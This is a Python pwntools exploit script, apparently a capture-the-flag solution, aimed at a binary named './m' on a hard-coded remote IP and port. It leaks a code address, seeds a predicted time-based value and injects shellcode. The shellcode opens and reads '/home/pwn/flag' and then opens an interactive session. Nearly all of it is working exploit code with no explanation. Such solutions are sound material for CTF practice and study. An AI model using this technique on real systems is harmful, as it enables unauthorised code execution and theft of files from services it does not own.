#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '159.65.125.233'
port = 31337

binary = "./m"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def write(context,author):
  r.recvuntil("4. Exit\n")
  r.sendline("1")
  r.recvuntil("Input content\n")
  r.send(context)
  r.recvuntil("Input author\n")
  r.send(author)
  pass

def show(Owner):
  r.recvuntil("4. Exit\n")
  r.sendline("3")
  r.recvuntil("New Owner : \n")
  r.send(Owner)
  pass

def delete(index):
  r.recvuntil("4. Exit\n")
  r.sendline("2")
  r.recvuntil(" index\n")
  r.sendline(str(index))
  pass

def fuck(text):
  r.recvuntil("4. Exit\n")
  r.sendline("31337")
  r.recvuntil("gift ")
  addr = r.recvuntil("\n")
  r.send(text)
  return addr

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  p = process("./time")
  ran = int(p.recvline()[:-1]) & 0xFFFFF000
  print "ran =", hex(ran)
  show(asm("push rbx") + asm("pop rdi") + asm("xchg ebx,eax")  +asm("push rbp") + asm("pop rsi")  + asm("syscall") )
  code = int(fuck("A\n"),16) - 0xEF4
  print "code =", hex(code)
  buf = code + 0x203000 - 0x400
  raw_input("@")
  fuck("A"*8 + p64(ran) + p64(ran))

  r.recvuntil("Done!!\n")
  payload = shellcraft.pushstr('/home/pwn/flag\x00')
  payload += shellcraft.openat(0,'rsp', 0, 0)
  payload += shellcraft.read('rax', 'rsp', 100)
  payload += shellcraft.write(1, 'rsp', 100)
  print payload

  r.sendline("\x90"*0x10 + asm(payload))

  r.interactive()

